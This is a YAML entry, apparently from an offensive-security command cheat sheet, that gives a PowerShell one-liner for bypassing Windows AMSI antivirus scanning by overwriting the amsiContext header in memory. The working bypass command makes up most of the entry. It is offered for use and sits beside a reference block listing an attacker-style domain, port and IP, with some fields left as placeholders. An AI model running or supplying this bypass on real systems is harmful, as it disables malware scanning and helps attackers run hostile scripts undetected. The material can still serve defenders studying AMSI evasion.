---
description: |
  One-liner to bypass the AMSI in a Powershell. Done by overwriting the amsiContext header by copying data (four zeros) from managed to unmanaged memory. When the context structure header is overwritten, this should force AmsiOpenSession to error out.

  Command Reference:
  ```
  Domain: arttoolkit.hacker.com

  Port: 9001

  IP address: 10.10.21.14
  ```
command: |
  $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

items:
  - Shell
services:
  - AV
OS:
  - Windows
attack_types:
  - ATTACK_TYPE
references:
  - LINK
  - LINK
---